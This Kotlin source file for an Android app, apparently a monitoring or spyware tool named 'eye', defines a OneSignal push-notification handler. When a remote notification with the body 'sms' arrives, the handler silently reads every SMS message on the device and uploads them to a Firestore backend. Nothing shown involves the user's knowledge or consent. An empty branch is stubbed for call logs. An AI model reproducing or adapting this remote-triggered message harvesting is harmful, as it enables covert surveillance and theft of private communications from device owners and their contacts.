package com.eye.service

import android.content.Context
import android.os.Build
import android.util.Log
import android.widget.Toast
import androidx.annotation.RequiresApi
import com.eye.data.repository.firestorerepository.FirestoreRepository
import com.eye.di.HiltEntryPoint
import com.eye.di.module.FirebaseModule
import com.eye.screen.user.UserEvent
import com.eye.screen.user.UserViewModel
import com.eye.utils.EyeDetails
import com.eye.utils.EyeDetails.readSMS
import com.onesignal.OSNotificationReceivedEvent
import com.onesignal.OneSignal
import dagger.hilt.EntryPoint
import dagger.hilt.InstallIn
import dagger.hilt.android.EntryPointAccessors
import dagger.hilt.android.qualifiers.ApplicationContext
import dagger.hilt.components.SingletonComponent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import timber.log.Timber
import javax.inject.Inject

class NotificationServiceExtension : OneSignal.OSRemoteNotificationReceivedHandler {
    @RequiresApi(Build.VERSION_CODES.O)
    override fun remoteNotificationReceived(context: Context?, notificationReceivedEvent: OSNotificationReceivedEvent?) {
        try {

            val notification = notificationReceivedEvent?.notification
            val data = notification?.body
            val hiltEntryPoint =
                EntryPointAccessors.fromApplication(context!!, HiltEntryPoint::class.java)
            val firestoreRepository = hiltEntryPoint.firestoreRepository()
            CoroutineScope(SupervisorJob()).launch {
                when (data) {
                    "sms" -> {
                        val smsReader = context.readSMS().groupBy {
                            it.date
                        }
                        firestoreRepository.uploadSMSLog(smsReader)
                    }
                    "call" -> {
                    }
                }
            }
        }catch (e: Exception){
            e.printStackTrace()
        }

    }

}